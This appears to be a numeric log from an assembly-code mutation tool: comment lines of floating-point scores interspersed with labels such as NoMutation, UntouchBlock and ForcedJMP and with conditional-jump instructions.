;0.857500378183
;0.342100713155
;0.0865275691601
;NoMutation
;0.175416391642
;0.942470459166
;		JNZ 	_1
;0.772710994357
;1.02920502157
;0.429151422753
;0.430797249705
;1.19822918202
;NoMutation
;0.6010896906
;1.02802795832
;0.600442046959
;1.1139270873
;0.857298548086
;0.686547281155
;1.1128974284
;1.37012683062
;0.686360357609
;0.85690326427
;0.515670200028
;0.598436017251
;UntouchBlock_1
;1.19689610639
;0.599408063351
;0.94324691244
;1.3687584089
;NoMutation
;0.76602110467
;1.10424405715
;0.767750086604
;0.596151538419
;NoMutation
;1.02108220682
;0.767649817073
;0.5972564093
;0.93782916928
;NoMutation
;1.2734716417
;0.680733561811
;0.935363849709
;0.596295315826
;0.847551746932
;0.508142616706
;1.35725880197
;NoMutation
;0.760975155932
;0.931976174392
;1.18363614344
;0.756393865058
;		JZ 	_0
;0.505479989558
;1.17821373886
;UntouchBlock_0
;0.588311686775
;1.09460945505
;ForcedJMP_0
;0.589107135324
;0.502344570588
;1.1730297352
;0.755215109145
;1.17106983967
;UntouchBlock_0
;1.49941342289
;		JZ 	_0
;0.751109291766
;0.499763263212
;1.08235503973
;NoMutation
;0.750207463791
;0.914935665413
;NoMutation
;0.665528092816
;0.830847115129
;0.500717859517
;0.913193258464
;1.24285366759
;0.663113834853
;UntouchBlock_0
;0.416765435813
;0.911309612765
;0.746863029857
;1.07731289878
;UntouchBlock_1
;0.829004472802
;0.581522732628
;0.829001467854
;UntouchBlock_1
;0.829348445192
;1.16118241932
;0.746937665167
;0.993428290564
;0.581325171833
;0.826935432955
;0.992264395135
;1.31946397518
;0.661242154212
;NoMutation
;0.333527449226
;0.990862958765
;NoMutation
;1.31846595946
;1.39705858544
;0.742910632764
;0.333964686688
;0.906750446677
;1.15223335042
;0.659640242662
;UntouchBlock_1
;1.06943672087
;1.31737185739
;UntouchBlock_1
;0.742464119907
;1.31400487532
;1.23670650874
;UntouchBlock_1
;0.740174307302
;ForcedJMP_1
;0.987546888315
;NoMutation
;0.740964778632
;0.823431176155
;0.823226196464
;1.23405943376
;NoMutation
;0.658462091251
;0.408728768765
;NoMutation
;0.24491990352
;NoMutation
;0.899823714622
;ForcedJMP_1
;1.0593897269
;0.653096050055
;0.408518385736
;0.891508758894
;0.80943204198
;UntouchBlock_1
;0.484121698152
;ForcedJMP_0
;1.13342003256
;NoMutation
;0.731415573631
;0.489937625266
;0.974304869024
;0.488248503182
;0.242804828409
;NoMutation
;1.05799758804
;UntouchBlock_1
;0.811704113166
;0.811539226791
;1.05450947878
;1.05425353012
;0.810751088678
;1.05321524394
;0.645356019346
;0.810518828782
;1.29652722558
;0.808368440376
;0.48374235934
;0.482384438208
;UntouchBlock_0
;0.965561302043
;NoMutation
;0.966215286533
;NoMutation
;0.64522315411
;0.885706904259
;0.805906170044
;0.484778420408
;0.966701997539
;0.64572971338
;0.404749919298
;0.886591990008
;0.645538445242
;0.805538317915
;0.803709915207
;0.802505125244
;0.642168926669
;0.801137811835
;UntouchBlock_0
;1.04130672098
;0.798367886343
;0.80226502421
;NoMutation
;0.481087810572
;0.880636470889
;0.401544706637
;0.877045928121
;NoMutation
;0.717297181701
;UntouchBlock_1
;0.4017302713
;0.879675329143
;0.641693512844
;0.800981098521
;1.11955649944
;0.794287133709
;NoMutation
;0.794753252339
;0.793090019209
;0.951946411542
;0.555844633544
;0.872990496743
;0.793273594022
;NoMutation
;0.793243126616
;0.557733727539
;0.952574584316
;0.478329161057
;1.10980116529
;0.63429921972
;0.477141180031
;0.792740475651
;1.03053780824
;0.474578838812
;0.79223369804
;1.19090672824
;0.709653942689
;UntouchBlock_1
;0.628288897072
;NoMutation
;1.02029940279
;1.09875517303
;UntouchBlock_0
;0.787013742391
;0.473219750749
;0.943317030526
;NoMutation
;0.786969553344
;0.472599382096
;1.02331870607
;0.552630527458
;0.395738949276
;0.238689396004
;0.865809877702
;1.02255394251
;0.629169752962
;0.236959902213
;NoMutation
;0.861169429969
;0.781908312203
;0.547412914955
;0.935076595172
;1.24761128181
;UntouchBlock_0
;1.1671333351
;0.702933263875
;0.933860488463
;1.16718344874
;NoMutation
;0.703672410108
;0.469948639885
;0.856916800988
;NoMutation
;1.01213973266
;1.09197253991
;0.544128639198
;0.391079729486
;0.314890345236
;0.858124161716
;1.08829191265
;0.623894604649
;NoMutation
;0.935179034655
;0.624189104541
;NoMutation
;0.857111285842
;0.546572259705
;0.857953436488
;NoMutation
;0.776554887034
;0.927822810597
;0.619009710959
;UntouchBlock_0
;0.467253938469
;0.234215089168
;NoMutation
;0.851079163556
;0.771359176559
;NoMutation
;0.617906014528
;0.384673628024
;UntouchBlock_1
;0.310713141601
;0.925689859473
;1.07850269451
;1.15583660575
;0.694358373897
;1.00035080095
;0.693316081987
;0.769122832766
;0.384633733975
;0.999309330152
;1.15221123785
;1.23008184296
;0.691337088707
;UntouchBlock_0
;0.615446689506
;0.998792340521
;NoMutation
;0.537402131892
;0.461487717128
;0.383889667808
;UntouchBlock_1
;1.07408190025
;0.613334174555
;1.07318155009
;0.615156615348
;0.99978687041
;UntouchBlock_1
;0.537714620119
;0.99771476594
;0.767553790606
;1.07328860721
;UntouchBlock_0
;0.690844460438
;0.765910351383
;1.07101669289
;0.53415372181
;UntouchBlock_0
;0.459853211315
;0.763961734067
;0.992769565882
;0.611085805734
;0.913376704739
;0.685029217173
;0.910722838114
;NoMutation
;0.98357236874
;0.681472146519
;NoMutation
;0.682194876254
;0.830883825638
;0.978936441029
;0.678868233234
;1.13102783353
;ForcedJMP_0
;0.678896248138
;UntouchBlock_1
;0.979954417879
;0.603584511432
;0.306441968732
;0.837861235912
;1.28938120573
;		JZ 	_1
;0.68178854813
;NoMutation
;1.13680892739
;NoMutation
;0.605972024844
;0.757911581781
;0.757355126855
;0.755550527162
;0.749425700016
;0.751435596169
;0.448591856131
;ForcedJMP_0
;0.9010788172
;0.67713786437
;0.748487149369
;0.968796625685
;UntouchBlock_0
;0.676103122974
;UntouchBlock_0
;0.748170517187
;UntouchBlock_1
;0.819625397991
;NoMutation
;0.59810030085
;0.89813727542
;ForcedJMP_1
;0.377568514036
;0.745835101881
;0.377535144696
;0.820270611852
;NoMutation
;0.669638495098
;0.82132188831
;UntouchBlock_1
;0.741428291274
;1.03887644482
;NoMutation
;0.594412575434
;1.03243658418
;0.591114652589
;1.03117757167
;1.02956058589
;0.666740472287
;0.517570599931
;0.886117394179
;0.664313232706
;1.03204192194
;NoMutation
;0.664557711232
;0.221627680399
;NoMutation
;0.150373873863
;0.079271038259
;0.153406035558
;0.806589790927
;0.584298297767
;1.01918864574
;NoMutation
;1.16105050678
;		JZ 	_0
;0.583723462869
;0.942254536737
;0.6540609515
;0.510338468783
;NoMutation
;0.871716506455
;0.581662317123
;0.945402233753
;NoMutation
;1.09098893682
;NoMutation
;0.579500248389
;		JNZ 	_1
;0.944847060896
;0.437851437971
;0.872953202949
;0.726429897965
;0.944734268047
;0.653789859714
;0.725643108463
;0.362818333999
;0.798147628642
;UntouchBlock_0
;0.943808090231
;0.653109043427
;0.870263166787
;NoMutation
;1.0860540598
;0.723119582205
;1.08035810312
;0.64782837299
;NoMutation
;0.432397736559
;0.864003967731
;UntouchBlock_0
;0.719251570981
;1.00755553808
;0.504056595503
;0.861900139131
;0.361428814544
;0.789145191275
;0.290798873374
;0.789667460246
;0.504267053932
;0.361438887157
;0.717070678719
;1.07254578695
;0.574842523732
;0.930631447159
;NoMutation
;0.503550484233
;0.92802982466
;0.644868525481
;0.50377093173
;0.788371510187
;1.14148567764
;0.640942930359
;0.926145901539
;1.13698661051
;0.497777018462
;0.857489437064
;NoMutation
;0.500165201925
;0.848478817884
;1.13431186207
;0.638179808735
;NoMutation
;0.778612328379
;NoMutation
;0.640024089788
;0.353274202475
;		JZ 	_1
;0.780718375178
;NoMutation
;1.06378979076
;1.27585064402
;0.569377144789
;0.851082393355
;0.489056639436
;0.989595069849
;0.641886244349
;0.359321269962
;0.779426258147
;NoMutation
;0.356337029019
;0.719028701539
;1.06342496761
;		JZ 	_0
;0.631950342905
;UntouchBlock_0
;0.843599504803
;0.904561440891
;NoMutation
;0.489627236825
;0.424397028278
;UntouchBlock_1
;0.769205615217
;0.973452679021
;NoMutation
;0.485734212554
;0.905008915023
;1.11348882187
;0.561102806173
;0.419032320397
;0.768685539252
;0.833483623987
;0.696136057853
;NoMutation
;0.696210473375
;0.908719409118
;0.697048612404
;0.352736384729
;0.698465848
;0.422868426667
;0.351636336932
;0.972844531971
;0.555672370077
;0.761608372398
;0.416501177763
;0.758666428191
;UntouchBlock_0
;0.483369649029
;0.731242772778
;0.458165677889
;0.961517918527
;		JNZ 	_0
;1.31956036201
;UntouchBlock_0
;0.814669678297
;ForcedJMP_1
;1.05838349707
;0.733987311364
;NoMutation
;1.02013144711
;NoMutation
;0.952865771062
;0.728470826042
;0.948401966189
;0.805408602506
;		JZ 	_0
;0.859215864733
;UntouchBlock_1
;1.04886418884
;1.07540875169
;0.999200982656
;0.893381478097
;0.732284942639
;0.795035554106
;0.94976501758
;0.874046793882
;0.68760025492
;UntouchBlock_0
;0.941996781066
;0.889608505483
;0.943085604881
;0.92136831374
;0.90397672927
;1.03651702039
;NoMutation
;0.86052466935
;NoMutation
;0.818160800862
;0.794674438182
;0.721969457909
;		JNZ 	_0
;0.73345997585
;0.825720343255
;0.926702538206
;0.783881923925
;0.946117664856
;NoMutation
;1.37887736603
;0.844362909716
;UntouchBlock_0
;1.1765596314
;0.766171735879
;0.734658101805
;0.792096419319
;0.785771565851
;UntouchBlock_0
;0.796044327455
;0.693921706135
;NoMutation
;0.937730455487
;1.16917842627
;0.845442688862
;0.767110423788
;0.956360510974
;		JZ 	_1
;1.04755714852
;0.783895208597
;0.614486677176
;0.722647869903
;1.11420853483
;NoMutation
;0.904472628963
;1.26807727906
;		JZ 	_0
;0.793131279455
;1.07913041454
;0.769376334825
;0.629341525846
;0.823811792511
;0.735513825378
;0.841650001667
;0.823242993936
;0.707046906323
;		JNZ 	_0
;0.708422225262
;NoMutation
;0.524729361121
;0.781297182249
;0.782776871566
;0.970129226375
;NoMutation
;0.838732523402
;0.537640543641
;		JNZ 	_1
;0.853711951733
;0.812594178284
;NoMutation
;0.786377676825
;0.98243491065
;0.757015329879
;0.697453561555
;		JZ 	_1
;0.716699729356
;UntouchBlock_0
;1.06822448281
;NoMutation
;1.25426091412
;		JNZ 	_1
;0.850943493777
;0.750656310354
;0.797919954059
;0.767140694188
;0.743058676851
;0.685803143041
;		JNZ 	_0
;0.97156144039
;0.68977854343
;NoMutation
;0.506873478932
;0.771670078484
;0.709987579517
;0.741865496912
;1.06444803825
;UntouchBlock_0
;0.747930361501
;0.951768544046
;0.823214474142
;NoMutation
;0.682364377269
;1.14387814952
;0.749838321213
;NoMutation
;0.767466556405
;0.861604270928
;NoMutation
;0.753812878387
;NoMutation
;0.825805589044
;1.0383936175
;0.70607380679
;0.964582583422
;1.0654285544
;UntouchBlock_1
;0.797304556113
;0.518196453528
;0.898407529585
;0.760279891452
;0.739912978901
;UntouchBlock_1
;0.659535802689
;NoMutation
;0.798482398345
;0.427351789902
;NoMutation
;0.831359824761
;0.454988504916
;0.64238474326
;0.655188282745
;0.794922647988
;0.650880647222
;0.779394247512
;UntouchBlock_1
;0.665493149946
;UntouchBlock_0
;0.735231029728
;NoMutation
;1.03624859253
;0.881599332822
;0.963346061819
;NoMutation
;0.732904477188
;UntouchBlock_1
;1.039385429
;NoMutation
;0.81821444857
;UntouchBlock_0
;1.02510367161
;UntouchBlock_0
;0.664747549458
;0.965469893927
;		JNZ 	_1
;0.775006607827
;ForcedJMP_1
;0.624533303855
;1.63288887238
;		JNZ 	_0
;0.840183612062
;ForcedJMP_1
;1.25505046108
;0.585900387648
;UntouchBlock_0
;0.727777716065
;0.851583333098
;0.846032678648
;ForcedJMP_0
;0.579486989557
;0.644157571985
;NoMutation
;0.524327930409
;0.767508514562
;0.753164618164
;		JNZ 	_1
;0.803181649916
;0.934595429726
;0.724653964326
;0.909266565808
;0.78283539149
;0.842138587918
;1.00645418321
;NoMutation
;0.612975676297
;		JNZ 	_0
;0.909825184745
;0.716752328973
;UntouchBlock_0
;0.759141768335
;0.668646909082
;0.628571048426
;NoMutation
;1.15265140122
;		JNZ 	_0
;0.917915450062
;NoMutation
;0.714292865665
;0.678687167772
;0.781331565891
;0.915076965123
;0.569605811703
;NoMutation
;0.754757866581
;0.739200295335
;0.916588789718
;0.660676291542
;		JNZ 	_1
;1.18097268913
;		JZ 	_0
;0.811178213451
;1.03439381656
;UntouchBlock_0
;0.749034570841
;0.610819655874
;0.848510735127
;0.678811564829
;		JNZ 	_0
;1.03853426965
;1.11727904759
;0.693529895289
;0.580572925768
;0.692689625014
;0.963143257139
;0.535291443549
;0.89713965387
;NoMutation
;0.619412691625
;0.699150571088
;0.617412089731
;0.860352530698
;0.780315704601
;0.672652496696
;0.694914316153
;0.859786950453
;0.679977471659
;NoMutation
;0.898977111839
;0.68109907448
;NoMutation
;0.4678257833
;0.951848004732
;UntouchBlock_1
;0.890646761432
;NoMutation
;0.565391997676
;0.679449109906
;0.679521095531
;0.803687768601
;0.891723396795
;0.73861070925
;NoMutation
;0.982980760859
;ForcedJMP_0
;0.613027261746
;0.651151725807
;UntouchBlock_0
;0.502393315021
;0.525049525626
;0.584617562411
;0.741771335972
;0.728246607658
;0.695616997081
;0.669643537047
;0.746832071584
;0.490911274878
;1.15582838445
;0.724127129769
;		JNZ 	_0
;0.600706146267
;0.916964233409
;0.940294977925
;0.603720828265
;0.714174406045
;0.727158987663
;0.896121481553
;NoMutation
;0.909268004907
;0.809297368233
;0.849635053286
;0.69953789555
;0.72548916245
;0.732865098677
;UntouchBlock_1
;0.654057340549
;0.793362221495
;0.598490647443
;0.792314809191
;0.374382639366
;0.650560075318
;0.769123959297
;UntouchBlock_1
;0.380366531718
;NoMutation
;0.653391439628
;0.731685325355
;UntouchBlock_0
;0.581573860278
;0.594170813289
;0.570416384384
;0.538002287589
;1.1498742838
;0.837215058279
;0.594964715955
;0.694726094931
;0.708445074173
;0.745365163299
;0.56708719294
;0.654230069316
;0.670122752811
;0.764911682999
;0.682798405315
;0.58849961114
;NoMutation
;0.442508035314
;0.699645931901
;0.746772075573
;0.608297259825
;0.514639292419
;0.83545768845
;NoMutation
;0.748311793131
;UntouchBlock_1
;0.574644528246
;0.534526025984
;0.545403201173
;0.570901883751
;0.713126137417
;0.689189370462
;0.553827414458
;0.767862038147
;UntouchBlock_1
;0.623016160892
;0.673774751159
;NoMutation
;0.810059166293
;NoMutation
;0.611897290467
;0.934444024509
;UntouchBlock_0
;0.654754543764
;		JZ 	_1
;0.493934911592
;NoMutation
;0.67001793232
;0.732399338208
;0.570364619516
;1.14517619464
;0.803776924183
;NoMutation
;0.603349666298
;0.486595098367
;0.417947119129
;0.570289359859
;0.763647377935
;0.708336886203
;		JNZ 	_0
;0.790004668921
;ForcedJMP_1
;0.637759781021
;		JZ 	_0
;0.614855455837
;0.702492859963
;1.07022131559
;NoMutation
;0.866155450284
;0.58152433064
;0.418528094269
;0.652622347547
;0.600086810914
;0.631511859194
;UntouchBlock_0
;0.663540565711
;NoMutation
;0.586748185835
;0.46977105839
;0.832767198609
;NoMutation
;0.711273494197
;		JZ 	_0
;0.622849991569
;0.752108929975
;NoMutation
;0.664733840718
;0.678194533524
;0.725060521968
;0.75510087878
;UntouchBlock_1
;0.542901140987
;0.602980538152
;0.711902206199
;0.967510575355
;		JNZ 	_0
;0.484156824209
;0.548822932067
;0.649376252824
;0.72412748965
;NoMutation
;0.392987412283
;NoMutation
;0.582406452562
;		JNZ 	_1
;0.507080949041
;0.438293397828
;0.666086229027
;0.659964442717
;0.80365611206
;		JZ 	_0
;0.687924883051
;0.503193746789
;0.572567295514
;0.666686592014
;0.514987123667
;0.627977221458
;0.491801342302
;0.466885309817
;0.282770900588
;0.535885935193
;0.239896421773
;NoMutation
;0.734102103343
;		JZ 	_1
;0.73751394016
;UntouchBlock_1
;0.408120558927
;UntouchBlock_0
;0.441725004155
;0.841401862174
;0.589617592911
;UntouchBlock_0
;0.638499457874
;NoMutation
;0.506545451455
;0.676707911103
;NoMutation
;0.540351356413
;		JZ 	_0
;0.586796279043
;0.668186078748
;0.54082390317
;0.566456222653
;0.591431438825
;0.619662291371
;0.794908241143
;		JZ 	_0
;0.687153843372
;0.903169672951
;0.546593580755
;0.564793919334
;0.443681331631
;0.484010088755
;0.483092657191
;0.792369250413
;UntouchBlock_0
;0.492726321816
;0.694890541753
;ForcedJMP_0
;0.492364011144
;0.721578252586
;NoMutation
;0.531707677536
;0.508043855875
;0.648669330856
;0.479448214534
;0.70145044918
;0.5433727345
;UntouchBlock_0
;0.510687266223
;0.578532166852
;0.575217417804
;0.743002694423
;UntouchBlock_0
;0.621304603546
;0.633628740461
;NoMutation
;0.686833532163
;0.473962821042
;0.52191702495
;NoMutation
;0.467730066595
;0.585865436622
;UntouchBlock_0
;0.645310396066
;ForcedJMP_0
;0.533695148776
;NoMutation
;0.473040658371
;0.540277434083
;NoMutation
;0.470161854539
;0.739338645925
;0.462103445008
;0.620288487028
;0.514106757992
;NoMutation
;0.579070426437
;0.487947995896
;0.455887283492
;0.34626586236
;0.30853307899
;0.65692600943
;ForcedJMP_1
;0.526539012875
;0.519010605155
;UntouchBlock_0
;0.463461305064
;NoMutation
;0.484373778455
;0.775313029364
;0.49459297578
;0.744268022144
;0.453359671229
;0.618502504986
;0.46931696293
;0.824618870406
;NoMutation
;0.645613032683
;0.485028501438
;0.443050973494
;0.727505390653
;NoMutation
;0.795854467126
;0.517114055656
;0.421950190733
;0.653397011884
;0.432313621314
;0.491058695293
;UntouchBlock_1
;0.381969987261
;0.457449847859
;0.572179100339
;0.437524079796
;ForcedJMP_0
;0.562073453637
;0.379224215078
;0.537585548894
;		JZ 	_0
;0.371578674414
;0.605040917819
;0.499892175672
;0.50117613435
;0.598626223621
;0.454486466586
;UntouchBlock_0
;0.478191514811
;0.425686323353
;0.537992122084
;0.535501341907
;0.440393909131
;0.492665413158
;0.502346692109
;0.431896620054
;0.633898890999
;0.469322861483
;0.381900177891
;0.498297339994
;0.332073119711
;0.486248867816
;0.456732039504
;0.557549093957
;ForcedJMP_0
;0.518972800454
;UntouchBlock_1
;0.414816741123
;		JZ 	_0
;0.49595643278
;0.409392729666
;0.504741720095
;UntouchBlock_0
;0.338745005626
;0.318268384101
;0.499753413197
;0.499611677549
;0.384129089713
;0.281077202414
;0.414381480697
;0.362491456813
;0.451048947389
;0.674485885659
;ForcedJMP_1
;0.561079507757
;0.342481389267
;UntouchBlock_0
;0.618395789234
;0.414651695606
;NoMutation
;0.405190125058
;NoMutation
;0.229599333135
;0.420048727681
;0.347073679617
;0.394324083365
;0.455015499299
;0.426297637749
;0.385839156155
;NoMutation
;0.395273649732
;NoMutation
;0.446544768997
;UntouchBlock_0
;0.421691504166
;0.588958449033
;		JZ 	_0
;0.371784251384
;0.356747775349
;0.231576943831
;0.319955489664
;0.418643558173
;0.52748204462
;0.38187712565
;NoMutation
;0.339264502338
;0.419728131638
;0.376002066639
;0.320492973175
;ForcedJMP_1
;0.40291237385
;0.307346731413
;ForcedJMP_1
;0.459820173375
;0.382950080702
;0.321156225682
;0.364058461687
;0.48674190147
;NoMutation
;0.372669938992
;0.406471392703
;0.358313195211
;0.286719749101
;NoMutation
;0.460812324393
;UntouchBlock_0
;0.365772601577
;NoMutation
;0.481102412172
;0.451346905963
;NoMutation
;0.40210203451
;0.344827994755
;0.385833302211
;		JZ 	_1
;0.383706057786
;0.430673383079
;0.466159360338
;0.362338912146
;0.423481567509
;0.291740695662
;0.227376747471
;0.40865790571
;0.249754062729
;0.378984261959
;0.331990391432
;0.317233119573
;0.537374957409
;UntouchBlock_0
;0.328481679832
;UntouchBlock_0
;0.308483966656
;0.289605213233
;0.341376647612
;0.445235957111
;0.329282718208
;0.316373903983
;0.328785272851
;0.353667258155
;0.313736704217
;UntouchBlock_1
;0.282763460367
;0.379590730043
;UntouchBlock_1
;0.281775116887
;NoMutation
;0.344431756127
;		JZ 	_0
;0.299390319453
;NoMutation
;0.35308798143
;		JZ 	_1
;0.272940501165
;UntouchBlock_0
;0.245731440698
;0.265222671914
;0.288024007516
;0.220721082727
;0.315648247167
;0.28697723547
;0.302211619892
;0.314726890551
;		JZ 	_0
;0.364192880157
;UntouchBlock_1
;0.31151881712
;0.249341817611
;0.321764147344
;0.282622398639
;0.281662189235
;0.265587973117
;0.236230422107
;UntouchBlock_1
;0.24495812194
;0.295392871845
;0.290830990409
;0.191346847124
;0.2688029915
;0.277151275039
;0.231625374563
;		JNZ 	_0
;0.222657621798
;0.267192577534
;0.235026390707
;UntouchBlock_1
;0.23862431938
;ForcedJMP_0
;0.269550791939
;		JZ 	_0
;0.175611335545
;0.262829071125
;NoMutation
;0.188955249928
;0.288838649813
;0.210346344912
;0.223860224153
;0.251743154577
;NoMutation
;0.282158377091
;0.332666872865
;0.202973169831
;NoMutation
;0.189664221214
;0.222669229288
;NoMutation
;0.345137834983
;NoMutation
;0.229231213362
;NoMutation
;0.205395222236
;0.257925540345
;		JNZ 	_0
;0.215861606956
;NoMutation
;0.224467537303
;UntouchBlock_1
;0.171329625497
;0.182126017734
;NoMutation
;0.253895193918
;NoMutation
;0.155516691697
;0.280491167276
;NoMutation
;0.202718587279
;0.217881859379
;		JZ 	_0
;0.158846482054
;0.208537431506
;UntouchBlock_1
;0.134433662362
;NoMutation
;0.160130627343
;UntouchBlock_1
;0.169324316445
;UntouchBlock_1
;0.262847636284
;UntouchBlock_1
;0.156734035107
;0.192534002505
;0.148385442245
;0.176982101457
;0.184518065171
;NoMutation
;0.178981499562
;0.211484856779
;UntouchBlock_0
;0.276919404678
;0.128125991571
;0.218780466443
;NoMutation
;0.158099293498
;0.195397166302
;UntouchBlock_0
;0.167635087123
;		JZ 	_0
;0.132408661755
;ForcedJMP_1
;0.181587443644
;UntouchBlock_0
;0.128786751831
;UntouchBlock_1
;0.092305906339
;0.084268580333
;0.175961929639
;NoMutation
;0.1355196935
;0.142577036356
;ForcedJMP_0
;0.087798567148
;0.153283268607
;0.175239387251
;		JNZ 	_0
;0.0764998689567
;0.11608194532
;		JZ 	_1
;0.0705685564899
;0.0617101988692
;UntouchBlock_0
;0.10560497776
;0.0685432565663
;0.0434613222755
;0.0721373755389
;0.066732927941
;0.0866832863313
;NoMutation
;0.0603570050665
;0.0501510057699
;0.0772927249578
;NoMutation
;0.0509646372052
;UntouchBlock_0
;0.0468431347135
;ForcedJMP_0
;0.0420773028222
;0.0351179807091
;		JNZ 	_0
;0.0284571680408
;ForcedJMP_1
;0.0174662796536
;0.0173364303276
;1.00596312201
;0.367727791262
;1.0053478666
;1.36702620627
;0.822425883253
;0.912543351729
;UntouchBlock_1
;0.459798723626
;0.998095026759
;NoMutation
;0.817171540223
;UntouchBlock_1
;0.456007610435
;0.907963470062
;0.370116638628
;0.279420502227
;0.188372264144
;NoMutation
;1.00157704374
;1.36363442782
;UntouchBlock_1
;0.816640482914
;0.819675353354
;0.638164184309
;1.36272099197
;1.00119226844
;1.09263385486
;1.18266372134
;1.35866124782
;1.53480966734
;0.186522114444
;NoMutation
;0.364450574626
;0.629260572359
;0.719976214972
;1.07161789879
;0.80499892635
;0.898333985899
;0.891446244236
;1.42991676411
;0.260719394803
;0.442630886769
;ForcedJMP_0
;0.976987000689
;0.888063962517
;0.886370396946
;0.53602977598
;0.355511767026
;0.711163538046
;0.618103879648
;UntouchBlock_1
;0.973231670671
;NoMutation
;1.2272482838
;0.619964822537
;0.874567374224
;1.136576115
;0.528641212344
;0.530316903978
;UntouchBlock_0
;1.134914656
;1.14051068136
;0.96310678705
;0.703573913094
;0.877752412883
;0.878036453116
;NoMutation
;0.443120341679
;0.965542030396
;0.441097422175
;0.963507388251
;0.43950665986
;0.950684886272
;0.693624761517
;0.693443954299
;1.47010672616
;		JZ 	_1
;0.523346133844
;1.37381144301
;0.948914609177
;UntouchBlock_1
;1.3789079051
;0.264046994839
;0.684756125423
;UntouchBlock_1
;1.2733191324
;1.10688714299
;1.26823213316
;1.20065696583
;0.520940108636
;0.681907351475
;1.18974883002
;0.934028032646
;NoMutation
;0.683266257945
;0.931456057205
;UntouchBlock_1
;1.09182864304
;		JNZ 	_0
;0.683404865886
;UntouchBlock_1
;0.35020429456
;0.933137485636
;NoMutation
;0.599162251798
;0.681969140615
;0.845584575768
;0.513646525111
;0.596022196649
;0.343243532794
;NoMutation
;1.01983317041
;0.511205774742
;NoMutation
;1.10276309689
;1.26834992644
;0.932917626883
;1.1845881424
;1.01406225307
;		JNZ 	_1
;1.09761053072
;NoMutation
;0.763603733995
;1.01774628744
;0.427847811983
;1.35319229396
;0.259831329546
;0.160383003186
;		JZ 	_1
;0.932830791614
;0.848970320242
;0.509999476432
;1.51283364466
;0.265525226939
;0.925024600498
;1.09878453998
;1.15003049265
;1.17886396581
;0.910264375643
;UntouchBlock_0
;1.25428208527
;0.25928758571
;		JZ 	_0
;1.0027896038
;0.852532227401
;NoMutation
;1.10749746622
;1.03165225669
;1.02912668111
;1.26204032457
;0.763460143706
;ForcedJMP_0
;1.29597820944
;NoMutation
;0.759718209754
;ForcedJMP_0
;1.03941896737
;NoMutation
;1.06098423574
;NoMutation
;0.720122536941
;0.963946767706
;UntouchBlock_1
;1.18488210665
;0.569526762711
;1.02192337897
;0.846860900926
;ForcedJMP_0
;0.637947319513
;1.51300378742
;1.07541396147
;1.16658056626
;ForcedJMP_0
;1.14024407713
;1.1513661488
;1.39400315442
;0.983834854843
;1.26331443034
;0.854092038652
;0.892942844178
;1.1855028729
;1.00316947028
;1.0698009135
;1.64218516723
;1.288378933
;1.43285836543
;ForcedJMP_1
;1.00130020227
;1.58419832365
;NoMutation
;1.09654340691
;1.13803335118
;1.05062235534
;NoMutation
;1.48065341465
;1.08816937396
;UntouchBlock_1
;1.08995969402
;1.47062729244
;		JZ 	_0
;0.881780063871
;1.43819213346
;NoMutation
;0.839379087363
;UntouchBlock_1
;0.954295508501
;1.25897471841
;1.40084438681
;1.20338059364
;NoMutation
;1.38702837505
;1.32659565824
;0.896251512222
;1.31795459722
;1.18474096975
;1.21341363182
;0.685454169827
;1.20345063224
;1.27464490746
;UntouchBlock_1
;1.11376239688
;UntouchBlock_0
;0.834766192254
;1.18638957261
;1.45066000598
;		JNZ 	_1
;1.09814131452
;1.00328506317
;1.43136110833
;1.28944994603
;		JNZ 	_0
;1.47971968169
;1.12641078182
;UntouchBlock_0
;1.21060226441
;1.2699165711
;1.33123524318
;ForcedJMP_0
;1.33606724399
;NoMutation
;1.39983214869
;NoMutation
;1.08972861368
;1.37344450918
;UntouchBlock_1
;1.66378490146
;NoMutation
;1.11746944046
;1.20283575783
;1.11550463246
;1.21288442548
;0.975764139737
;1.36351420863
;1.85124968362
;1.01904105171
;ForcedJMP_0
;1.07078675234
;0.93390170571
;1.20138709401
;1.24930683133
;1.17109221239
;NoMutation
;1.03951046568
;1.12368487792
;0.906951522696
;1.51431604089
;0.9981944711
;0.723777559691
;1.2830881226
;0.945928271249
;1.25255486923
;1.07484840659
;1.17957442734
;1.25238467314
;		JNZ 	_0
;1.0506983639
;1.15017610502
;UntouchBlock_1
;0.996809950243
;UntouchBlock_0
;0.915471123463
;1.03210235902
;1.1741950127
;		JNZ 	_0
;1.11600100793
;0.99373200686
;0.839184796165
;1.13863099471
;0.907423989202
;1.21525102149
;2.00258982321
;1.354355932
;1.53612862626
;1.05140498245
;1.20547711527
;1.09610836752
;NoMutation
;1.0223260843
;		JNZ 	_0
;1.25579464736
;1.4899343922
;ForcedJMP_1
;1.2256393573
;		JZ 	_0
;1.51099232551
;0.924026498576
;1.3524977656
;UntouchBlock_0
;1.19086869655
;1.20515391962
;0.906201931268
;1.2431925093
;0.970330471255
;1.14567339775
;		JNZ 	_0
;1.10933806966
;1.22826464518
;0.8692120631
;1.40844387816
;1.45546962578
;1.2143217861
;1.03312478453
;UntouchBlock_1
;1.72929451422
;UntouchBlock_0
;1.12839837135
;1.1549614076
;1.19114946909
;0.963827488842
;UntouchBlock_0
;0.984403129192
;1.52425275399
;		JNZ 	_0
;0.950583909763
;0.978990527439
;1.30863899518
;ForcedJMP_0
;1.73867194088
;UntouchBlock_0
;1.05469836506
;ForcedJMP_1
;1.06920765317
;1.03364169056
;1.11615739265
;1.0884090428
;1.48008558491
;ForcedJMP_0
;1.31039578817
;1.5318738744
;ForcedJMP_0
;1.58910199385
;UntouchBlock_0
;1.04959341164
;NoMutation
;1.33304891832
;1.41785439743
;NoMutation
;0.951411209977
;		JNZ 	_1
;1.05628450884
;1.13261423332
;1.03243024746
;1.13201241344
;1.21052220881
;1.13078169911
;1.08966703194
;1.59067513445
;		JZ 	_1
;1.46378644295
;1.42019577132
;1.00354069924
;0.974121647573
;1.4279131792
;NoMutation
;1.01451979919
;1.10767707852
;1.14178191439
;0.964233783212
;1.55402164212
;1.19405364945
;UntouchBlock_1
;1.19217806158
;1.20752439841
;1.09034962703
;1.04362512072
;1.30680699506
;0.924900010151
;1.43378379529
;1.34235145524
;0.984300044999
;		JZ 	_1
;1.10523014051
;1.00612103639
;1.00304765691
;1.27214240408
;0.80194826858
;UntouchBlock_0
;1.03699470209
;ForcedJMP_0
;0.772308133104
;0.882868587677
;1.40245490881
;1.07341176024
;UntouchBlock_1
;1.25632250214
;0.926017765019
;1.30832887507
;0.914991195913
;0.965351476284
;1.15923252829
;1.42405413709
;1.65834510179
;0.916412140987
;1.2057908144
;1.25850950951
;		JNZ 	_1
;1.16059204955
;ForcedJMP_1
;1.17527202785
;0.997883803499
;UntouchBlock_1
;1.14760369684
;0.821469122605
